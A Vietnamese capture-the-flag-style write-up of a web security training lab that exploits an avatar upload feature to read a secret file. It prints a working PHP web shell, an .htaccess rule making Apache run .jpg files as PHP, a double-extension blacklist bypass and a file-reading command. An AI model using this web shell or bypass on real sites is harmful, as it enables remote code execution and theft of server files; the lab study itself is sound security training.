<img width="1005" height="670" alt="image" src="https://github.com/user-attachments/assets/5149112f-9be9-4abc-8948-4d41bebde6b6" />

# Tổng quan

Đầu tiên ta đăng nhập với tài khoản wiener và mật khẩu peter được cấp từ trước

Sau khi đăng nhập,ta thấy có chức năng Upload Avatar có khả năng là File Upload Vuln

Mục tiêu của ta là đọc được nội dung của `/home/carlos/secret`

# Khai Thác
Ta thử upload file `exploit.php` : 

```
<html>

<body>
    <form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
        <input type="TEXT" name="cmd" autofocus id="cmd" size="80">
        <input type="SUBMIT" value="Execute">
    </form>
    <pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd'] . ' 2>&1');
    }
   
?>
</pre>
</body>

</html>
```

<img width="1691" height="893" alt="image" src="https://github.com/user-attachments/assets/0e6c677e-1fcd-43f6-8176-67f391ba9978" />

Có vẻ như là web đã chặn file php,ta thử với tệp .txt:

<img width="1695" height="898" alt="image" src="https://github.com/user-attachments/assets/bcc07f3e-a5ff-49e7-96ea-a75cc19a790f" />

Ta có thể thấy file .txt không bị chặn nên ta có thể suy ra đây là do web đã sử dụng blacklist để chặn file độc được upload lên 

Vậy nên ta sẽ sử dụng trick dùng file `.htaccess` có chứa nội dung :
```
AddType application/x-httpd-php .jpg
```
<img width="1691" height="889" alt="image" src="https://github.com/user-attachments/assets/4fd65a22-bb3f-4db6-aff1-acdb9105b883" />

Mục đích là để cho file `.jpg` có thể được Apache chuyển cho PHP handler thay vì coi nó đơn thuần là ảnh 

Ta có thể bypass bằng cách Đổi tên payload từ exploit.php thành exploit.php.jpg. Blacklist chỉ nhìn extension cuối cùng là .jpg, trong khi .htaccess đã cấu hình Apache xử lý .jpg bằng PHP handler:

<img width="1688" height="892" alt="image" src="https://github.com/user-attachments/assets/04698348-4a93-4a2b-95af-8fa0ae506ef3" />

Sau đó ta thử truy cập vào file `exploit.php.jpg` mà ta vừa upload:

<img width="1706" height="971" alt="image" src="https://github.com/user-attachments/assets/cbf179ae-6ea1-4f01-b8e4-0ed88453dc14" />

Vậy là ta đã thành công upload file và thực thi file PHP tiếp theo ta dùng command linux:

```
cat /home/carlos/secret
```

<img width="1706" height="971" alt="image" src="https://github.com/user-attachments/assets/d2f89099-f49d-4458-9a88-fab2370ab85a" />

Vậy ta đọc được nội dung của `/home/carlos/secret` là: `XSlwAQEjtzRXNVKwMAISi44EJz3wwFG7` 

Việc còn lại của ta là submit và solved lab 

<img width="1705" height="971" alt="image" src="https://github.com/user-attachments/assets/df2af3ab-27f7-4617-9ad0-8e5bbd9fb3d5" />

=> Solved!
